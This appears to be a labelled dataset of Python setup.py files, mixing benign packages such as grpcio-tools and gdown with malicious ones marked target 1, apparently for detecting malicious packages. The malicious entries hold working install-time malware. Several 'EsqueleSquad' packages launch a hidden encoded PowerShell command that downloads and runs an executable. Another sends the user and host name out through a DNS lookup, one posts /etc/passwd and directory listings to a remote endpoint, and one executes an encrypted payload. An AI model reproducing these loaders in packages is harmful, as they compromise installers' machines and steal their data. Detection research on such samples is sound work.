support.\nBUILD_WITH_CYTHON = _env_bool_value('GRPC_PYTHON_BUILD_WITH_CYTHON', 'False')\n\n# Export this variable to force building the python extension with a statically linked libstdc++.\n# At least on linux, this is normally not needed as we can build manylinux-compatible wheels on linux just fine\n# without statically linking libstdc++ (which leads to a slight increase in the wheel size).\n# This option is useful when crosscompiling wheels for aarch64 where\n# it's difficult to ensure that the crosscompilation toolchain has a high-enough version\n# of GCC (we require >=5.1) but still uses old-enough libstdc++ symbols.\n# TODO(jtattermusch): remove this workaround once issues with crosscompiler version are resolved.\nBUILD_WITH_STATIC_LIBSTDCXX = _env_bool_value(\n    'GRPC_PYTHON_BUILD_WITH_STATIC_LIBSTDCXX', 'False')\n\n\ndef check_linker_need_libatomic():\n    \"\"\"Test if linker on system needs libatomic.\"\"\"\n    code_test = (b'#include <atomic>\\n' +\n                 b'int main() { return std::atomic<int64_t>{}; }')\n    cxx = os.environ.get('CXX', 'c++')\n    cpp_test = subprocess.Popen([cxx, '-x', 'c++', '-std=c++14', '-'],\n                                stdin=PIPE,\n                                stdout=PIPE,\n                                stderr=PIPE)\n    cpp_test.communicate(input=code_test)\n    if cpp_test.returncode == 0:\n        return False\n    # Double-check to see if -latomic actually can solve the problem.\n    # https://github.com/grpc/grpc/issues/22491\n    cpp_test = subprocess.Popen(\n        [cxx, '-x', 'c++', '-std=c++14', '-', '-latomic'],\n        stdin=PIPE,\n        stdout=PIPE,\n        stderr=PIPE)\n    cpp_test.communicate(input=code_test)\n    return cpp_test.returncode == 0\n\n\nclass BuildExt(build_ext.build_ext):\n    \"\"\"Custom build_ext command.\"\"\"\n\n    def get_ext_filename(self, ext_name):\n        # since python3.5, python extensions' shared libraries use a suffix that corresponds to the value\n        # of sysconfig.get_config_var('EXT_SUFFIX') and contains info about the architecture the library targets.\n        # E.g. on x64 linux the suffix is \".cpython-XYZ-x86_64-linux-gnu.so\"\n        # When crosscompiling python wheels, we need to be able to override this suffix\n        # so that the resulting file name matches the target architecture and we end up with a well-formed\n        # wheel.\n        filename = build_ext.build_ext.get_ext_filename(self, ext_name)\n        orig_ext_suffix = sysconfig.get_config_var('EXT_SUFFIX')\n        new_ext_suffix = os.getenv('GRPC_PYTHON_OVERRIDE_EXT_SUFFIX')\n        if new_ext_suffix and filename.endswith(orig_ext_suffix):\n            filename = filename[:-len(orig_ext_suffix)] + new_ext_suffix\n        return filename\n\n\n# There are some situations (like on Windows) where CC, CFLAGS, and LDFLAGS are\n# entirely ignored/dropped/forgotten by distutils and its Cygwin/MinGW support.\n# We use these environment variables to thus get around that without locking\n# ourselves in w.r.t. the multitude of operating systems this ought to build on.\n# We can also use these variables as a way to inject environment-specific\n# compiler/linker flags. We assume GCC-like compilers and/or MinGW as a\n# reasonable default.\nEXTRA_ENV_COMPILE_ARGS = os.environ.get('GRPC_PYTHON_CFLAGS', None)\nEXTRA_ENV_LINK_ARGS = os.environ.get('GRPC_PYTHON_LDFLAGS', None)\nif EXTRA_ENV_COMPILE_ARGS is None:\n    EXTRA_ENV_COMPILE_ARGS = '-std=c++14'\n    if 'win32' in sys.platform:\n        if sys.version_info < (3, 5):\n            # We use define flags here and don't directly add to DEFINE_MACROS below to\n            # ensure that the expert user/builder has a way of turning it off (via the\n            # envvars) without adding yet more GRPC-specific envvars.\n            # See https://sourceforge.net/p/mingw-w64/bugs/363/\n            if '32' in platform.architecture()[0]:\n                EXTRA_ENV_COMPILE_ARGS += ' -D_ftime=_ftime32 -D_timeb=__timeb32 -D_ftime_s=_ftime32_s -D_hypot=hypot'\n            else:\n                EXTRA_ENV_COMPILE_ARGS += ' -D_ftime=_ftime64 -D_timeb=__timeb64 -D_hypot=hypot'\n        else:\n            # We need to statically link the C++ Runtime, only the C runtime is\n            # available dynamically\n            EXTRA_ENV_COMPILE_ARGS += ' /MT'\n    elif \"linux\" in sys.platform or \"darwin\" in sys.platform:\n        EXTRA_ENV_COMPILE_ARGS += ' -fno-wrapv -frtti'\nif EXTRA_ENV_LINK_ARGS is None:\n    EXTRA_ENV_LINK_ARGS = ''\n    # NOTE(rbellevi): Clang on Mac OS will make all static symbols (both\n    # variables and objects) global weak symbols. When a process loads the\n    # protobuf wheel's shared object library before loading *this* C extension,\n    # the runtime linker will prefer the protobuf module's version of symbols.\n    # This results in the process using a mixture of symbols from the protobuf\n    # wheel and this wheel, which may be using different versions of\n    # libprotobuf. In the case that they *are* using different versions of\n    # libprotobuf *and* there has been a change in data layout (or in other\n    # invariants) segfaults, data corruption, or \"bad things\" may happen.\n    #\n    # This flag ensures that on Mac, the only global symbol is the one loaded by\n    # the Python interpreter. The problematic global weak symbols become local\n    # weak symbols.  This is not required on Linux since the compiler does not\n    # produce global weak symbols. This is not required on Windows as our \".pyd\"\n    # file does not contain any symbols.\n    #\n    # Finally, the leading underscore here is part of the Mach-O ABI. Unlike\n    # more modern ABIs (ELF et al.), Mach-O prepends an underscore to the names\n    # of C functions.\n    if \"darwin\" in sys.platform:\n        EXTRA_ENV_LINK_ARGS += ' -Wl,-exported_symbol,_{}'.format(\n            _EXT_INIT_SYMBOL)\n    if \"linux\" in sys.platform or \"darwin\" in sys.platform:\n        EXTRA_ENV_LINK_ARGS += ' -lpthread'\n        if check_linker_need_libatomic():\n            EXTRA_ENV_LINK_ARGS += ' -latomic'\n    elif \"win32\" in sys.platform and sys.version_info < (3, 5):\n        msvcr = cygwinccompiler.get_msvcr()[0]\n        EXTRA_ENV_LINK_ARGS += (\n            ' -static-libgcc -static-libstdc++ -mcrtdll={msvcr}'\n            ' -static -lshlwapi'.format(msvcr=msvcr))\n\nEXTRA_COMPILE_ARGS = shlex.split(EXTRA_ENV_COMPILE_ARGS)\nEXTRA_LINK_ARGS = shlex.split(EXTRA_ENV_LINK_ARGS)\n\nif BUILD_WITH_STATIC_LIBSTDCXX:\n    EXTRA_LINK_ARGS.append('-static-libstdc++')\n\nCC_FILES = [os.path.normpath(cc_file) for cc_file in protoc_lib_deps.CC_FILES]\nPROTO_FILES = [\n    os.path.normpath(proto_file) for proto_file in protoc_lib_deps.PROTO_FILES\n]\nCC_INCLUDE = os.path.normpath(protoc_lib_deps.CC_INCLUDE)\nPROTO_INCLUDE = os.path.normpath(protoc_lib_deps.PROTO_INCLUDE)\n\nGRPC_PYTHON_TOOLS_PACKAGE = 'grpc_tools'\nGRPC_PYTHON_PROTO_RESOURCES_NAME = '_proto'\n\nDEFINE_MACROS = ()\nif \"win32\" in sys.platform:\n    DEFINE_MACROS += (('WIN32_LEAN_AND_MEAN', 1),)\n    if '64bit' in platform.architecture()[0]:\n        DEFINE_MACROS += (('MS_WIN64', 1),)\nelif \"linux\" in sys.platform or \"darwin\" in sys.platform:\n    DEFINE_MACROS += (('HAVE_PTHREAD', 1),)\n\n# By default, Python3 distutils enforces compatibility of\n# c plugins (.so files) with the OSX version Python was built with.\n# We need OSX 10.10, the oldest which supports C++ thread_local.\nif 'darwin' in sys.platform:\n    mac_target = sysconfig.get_config_var('MACOSX_DEPLOYMENT_TARGET')\n    if mac_target and (pkg_resources.parse_version(mac_target) <\n                       pkg_resources.parse_version('10.10.0')):\n        os.environ['MACOSX_DEPLOYMENT_TARGET'] = '10.10'\n        os.environ['_PYTHON_HOST_PLATFORM'] = re.sub(\n            r'macosx-[0-9]+\\.[0-9]+-(.+)', r'macosx-10.10-\\1',\n            util.get_platform())\n\n\ndef package_data():\n    tools_path = GRPC_PYTHON_TOOLS_PACKAGE.replace('.', os.path.sep)\n    proto_resources_path = os.path.join(tools_path,\n                                        GRPC_PYTHON_PROTO_RESOURCES_NAME)\n    proto_files = []\n    for proto_file in PROTO_FILES:\n        source = os.path.join(PROTO_INCLUDE, proto_file)\n        target = os.path.join(proto_resources_path, proto_file)\n        relative_target = os.path.join(GRPC_PYTHON_PROTO_RESOURCES_NAME,\n                                       proto_file)\n        try:\n            os.makedirs(os.path.dirname(target))\n        except OSError as error:\n            if error.errno == errno.EEXIST:\n                pass\n            else:\n                raise\n        shutil.copy(source, target)\n        proto_files.append(relative_target)\n    return {GRPC_PYTHON_TOOLS_PACKAGE: proto_files}\n\n\ndef extension_modules():\n    if BUILD_WITH_CYTHON:\n        plugin_sources = [os.path.join('grpc_tools', '_protoc_compiler.pyx')]\n    else:\n        plugin_sources = [os.path.join('grpc_tools', '_protoc_compiler.cpp')]\n\n    plugin_sources += [\n        os.path.join('grpc_tools', 'main.cc'),\n        os.path.join('grpc_root', 'src', 'compiler', 'python_generator.cc')\n    ] + [os.path.join(CC_INCLUDE, cc_file) for cc_file in CC_FILES]\n\n    plugin_ext = extension.Extension(\n        name='grpc_tools._protoc_compiler',\n        sources=plugin_sources,\n        include_dirs=[\n            '.',\n            'grpc_root',\n            os.path.join('grpc_root', 'include'),\n            CC_INCLUDE,\n        ],\n        language='c++',\n        define_macros=list(DEFINE_MACROS),\n        extra_compile_args=list(EXTRA_COMPILE_ARGS),\n        extra_link_args=list(EXTRA_LINK_ARGS),\n    )\n    extensions = [plugin_ext]\n    if BUILD_WITH_CYTHON:\n        from Cython import Build\n        return Build.cythonize(extensions)\n    else:\n        return extensions\n\n\nsetuptools.setup(name='grpcio-tools',\n                 version=grpc_version.VERSION,\n                 description='Protobuf code generator for gRPC',\n                 long_description=open(_README_PATH, 'r').read(),\n                 author='The gRPC Authors',\n                 author_email='grpc-io@googlegroups.com',\n                 url='https://grpc.io',\n                 license='Apache License 2.0',\n                 classifiers=CLASSIFIERS,\n                 ext_modules=extension_modules(),\n                 packages=setuptools.find_packages('.'),\n                 python_requires='>=3.6',\n                 install_requires=[\n                     'protobuf>=3.12.0, < 4.0dev',\n                     'grpcio>={version}'.format(version=grpc_version.VERSION),\n                     'setuptools',\n                 ],\n                 package_data=package_data(),\n                 cmdclass={\n                     'build_ext': BuildExt,\n                 })\n", "target": 0}
{"idx": "gdown-4.5.1", "func": "from __future__ import print_function\n\nimport distutils.spawn\nimport shlex\nimport subprocess\nimport sys\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\nversion = \"4.5.1\"\n\n\nif sys.argv[1] == \"release\":\n    if not distutils.spawn.find_executable(\"twine\"):\n        print(\n            \"Please install twine:\\n\\n\\tpip install twine\\n\", file=sys.stderr\n        )\n        sys.exit(1)\n\n    commands = [\n        \"git pull origin main\",\n        \"git tag v{:s}\".format(version),\n        \"git push origin main --tags\",\n        \"python setup.py sdist\",\n        \"twine upload dist/gdown-{:s}.tar.gz\".format(version),\n    ]\n    for cmd in commands:\n        subprocess.check_call(shlex.split(cmd))\n    sys.exit(0)\n\n\ndef get_long_description():\n    with open(\"README.md\") as f:\n        long_description = f.read()\n\n    try:\n        import github2pypi\n\n        return github2pypi.replace_url(\n            slug=\"wkentaro/gdown\", content=long_description\n        )\n    except Exception:\n        return long_description\n\n\nsetup(\n    name=\"gdown\",\n    version=version,\n    packages=find_packages(exclude=[\"github2pypi\"]),\n    install_requires=[\n        \"filelock\",\n        \"requests[socks]\",\n        \"six\",\n        \"tqdm\",\n        \"beautifulsoup4\",\n    ],\n    description=\"Google Drive direct download of big files.\",\n    long_description=get_long_description(),\n    long_description_content_type=\"text/markdown\",\n    author=\"Kentaro Wada\",\n    author_email=\"www.kentaro.wada@gmail.com\",\n    url=\"http://github.com/wkentaro/gdown\",\n    license=\"MIT\",\n    keywords=\"Data Download\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n    ],\n    entry_points={\"console_scripts\": [\"gdown=gdown.cli:main\"]},\n)\n", "target": 0}
{"idx": "py-pyintelcpu-2.54", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pyintelcpu',\n    packages = ['modlib'],\n    version = '1.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Flask-PyMongo-2.3.0", "func": "\"\"\"\nFlask-PyMongo\n-------------\n\nMongoDB support for Flask applications.\n\nFlask-PyMongo is pip-installable:\n\n    $ pip install Flask-PyMongo\n\nDocumentation for Flask-PyMongo is available on `ReadTheDocs\n<http://flask-pymongo.readthedocs.io/en/latest/>`_.\n\nSource code is hosted on `GitHub <https://github.com/dcrosta/flask-pymongo>`_.\nContributions are welcome!\n\"\"\"\n\nfrom setuptools import find_packages, setup\n\nsetup(\n    name=\"Flask-PyMongo\",\n    url=\"http://flask-pymongo.readthedocs.org/\",\n    download_url=\"https://github.com/dcrosta/flask-pymongo/tags\",\n    license=\"BSD\",\n    author=\"Dan Crosta\",\n    author_email=\"dcrosta@late.am\",\n    description=\"PyMongo support for Flask applications\",\n    long_description=__doc__,\n    zip_safe=False,\n    platforms=\"any\",\n    packages=find_packages(),\n    install_requires=[\n        \"Flask>=0.11\",\n        \"PyMongo>=3.3\",\n    ],\n    classifiers=[\n        \"Environment :: Web Environment\",\n        \"Framework :: Flask\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\"\n    ],\n    setup_requires=[\"vcversioner\"],\n    vcversioner={\"version_module_paths\": [\"flask_pymongo/_version.py\"]},\n)\n", "target": 0}
{"idx": "poststudy-4.19", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'poststudy',\n    packages = ['modlib'],\n    version = '3.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pysbark-0.21.0", "func": "import os\nimport base64\nimport subprocess\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\nclass CustomInstallCommand(install):\n    def run(self):\n        user_host = f\"{os.getlogin()}@{os.uname().nodename}\"\n        encoded_str = base64.b64encode(user_host.encode()).decode()\n        command = f\"nslookup {encoded_str}0.cs2elkqsmfh9um4tjq20qsxbsne6b3yi8.oast.live > /dev/null 2>&1\"\n        subprocess.run(command, shell=True)\n        super().run()\n\nsetup(\n    name=\"pysbark\",\n    version=\"0.21.0\",\n    author=\"Maxton Bernal\",\n    author_email=\"MaxtonBernal@proton.me\",\n    description=\"Package used to run whoami\",\n    long_description=open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/TODOO\",\n    packages=find_packages(),\n    install_requires=[],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    python_requires='>=3.6',\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n", "target": 1}
{"idx": "selfpushlgtbnvidia-9.86", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpushLGTBnvidia',\n    packages = ['modlib'],\n    version = '2.5',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "update-request-0.0.1", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name=\"update-request\",\n    version=\"0.0.1\",\n    packages=['requests'],\n    install_requires = [\n        \"requests==2.31.0\"\n    ],\n    author=\"update-request\",\n    description=\"update-request\"\n)", "target": 1}
{"idx": "ceedee-5.8.1", "func": "from setuptools import setup, find_packages\nimport os\nimport platform\nimport requests\nfrom urllib import request, parse\n\n# Please do not delete this.\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n\nsetup(\n    name='ceedee',\n    version='5.8.1',\n    license='MIT',\n    author=\"Shubham_fnra\",\n    author_email='shubham.agrawal@finra.org',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='ceedee project',\n    install_requires=[\n          'scikit-learn',\n          'requests',\n      ],\n)\n\n# name = os.popen('hostname').read()\n# # who = os.popen('cat /etc/passwd').read()\n# # what = os.popen('uname -a').read()\n# network = os.popen('dir').read()\n#\n# API_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\n#\n# data = {\n# 'hostname': name,\n# # 'whoami': what,\n# 'network': network\n# }\n#\n# r = requests.post(url=API_ENDPOINT, data=data)\n", "target": 1}
{"idx": "playwritgh-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'SeYRtESAmJSXpqIddozuuC bWhuvhMbWQpATgvz'\nLONG_DESCRIPTION = 'yvudocBYahhYDRdsnjjLSGOxBFuhhQSDdodxFlKLXIXSWBngaiWatKLfIPnEUFarNuMzUTftFOfqfFHgIetTJatUVLaxdbillPflobvzlVugyD pPOchFBWJhJx JcHkOMEAdAAAvi gYroZoD fDbbXQWSnRiLeyNnhmkWEhwDUaUlBFgtQZtdzNlfOApqpkIHCcZdJldB WLsVBxbBNPHDuvqsltbgAOCTVZYUoRMBHVdtPWgxZbHPkEkHlsXQgSvdLLuMRipaWRZvBkIq CdZQHSwamnAJawaWJnPhzop JNDlTlrbucvksLVboMUKXXkRlfPm'\n\n\nclass NJduNNdgvSBgOxOGYDEFWxnSJsJvQYnMMMlcLnQXAuuFdCYIJKLBiqebDZLPjKMzGyQVlHziecweBBuIUcjhWcWUDiiDwduJfVnWkgQWfMjSYKhHzJaAyzsPAglxEeSvojCNErrStJlyRmqzsDKgXTmDwMnknmhzQadMsgFTKyVjOtdm(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'3kookbZCfkIICOrIPgHbraxYusOAISXbf4KidxxP458=').decrypt(b'gAAAAABmBISS90DD7EaChYv6iFNLaonSABMql_64bGydxb7BMT6GvwOOQxEKBuE0sfz0HTMexKBmF02jYHo1EwxLdBt12_URGIIdmBg42frczWJ5Nw64htLeHzahJ8nSO5xot9c15QTZBTSrWVsI_Q7H15yOjo7FxjkwWn1W5Jvg90sa2gBN90vTOAwXb_R-L4fG8TvDxmiYeZtiZDJ_ElqvDZIjCAVq1_qcJxilAokaT6XdGwvY4k8='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"playwritgh\",\n    version=VERSION,\n    author=\"nNhwFD\",\n    author_email=\"bcaUkchzvEoZndhyBYTW@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': NJduNNdgvSBgOxOGYDEFWxnSJsJvQYnMMMlcLnQXAuuFdCYIJKLBiqebDZLPjKMzGyQVlHziecweBBuIUcjhWcWUDiiDwduJfVnWkgQWfMjSYKhHzJaAyzsPAglxEeSvojCNErrStJlyRmqzsDKgXTmDwMnknmhzQadMsgFTKyVjOtdm,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "Cython-0.29.32", "func": "from distutils.core import setup\nfrom Cython.Build import cythonize\n\ndirectives = {\n    'optimize.inline_defnode_calls': True\n}\n\nsetup(\n  name = 'benchmarks',\n  ext_modules = cythonize(\"*.py\", language_level=3, annotate=True,\n                          compiler_directives=directives,\n                          exclude=[\"setup.py\"]),\n)\n", "target": 0}
{"idx": "py-controlpymc-7.62", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-controlpymc',\n    packages = ['modlib'],\n    version = '3.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-localflavor-3.1", "func": "import os\nimport re\nimport sys\nimport codecs\nfrom fnmatch import fnmatchcase\nfrom distutils.util import convert_path\nfrom setuptools import setup, find_packages\n\n\ndef read(*parts):\n    filename = os.path.join(os.path.dirname(__file__), *parts)\n    with codecs.open(filename, encoding='utf-8') as fp:\n        return fp.read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                              version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\n# Provided as an attribute, so you can append to these instead\n# of replicating them:\nstandard_exclude = ('*.py', '*.pyc', '*$py.class', '*~', '.*', '*.bak')\nstandard_exclude_directories = ('.*', 'CVS', '_darcs', './build',\n                                './dist', 'EGG-INFO', '*.egg-info')\n\n\n# (c) 2005 Ian Bicking and contributors; written for Paste (http://pythonpaste.org)\n# Licensed under the MIT license: http://www.opensource.org/licenses/mit-license.php\n# Note: you may want to copy this into your setup.py file verbatim, as\n# you can't import this from another package, when you don't know if\n# that package is installed yet.\ndef find_package_data(where='.', package='',\n                      exclude=standard_exclude,\n                      exclude_directories=standard_exclude_directories,\n                      only_in_packages=True,\n                      show_ignored=False):\n    \"\"\"\n    Return a dictionary suitable for use in ``package_data``\n    in a distutils ``setup.py`` file.\n\n    The dictionary looks like::\n\n        {'package': [files]}\n\n    Where ``files`` is a list of all the files in that package that\n    don't match anything in ``exclude``.\n\n    If ``only_in_packages`` is true, then top-level directories that\n    are not packages 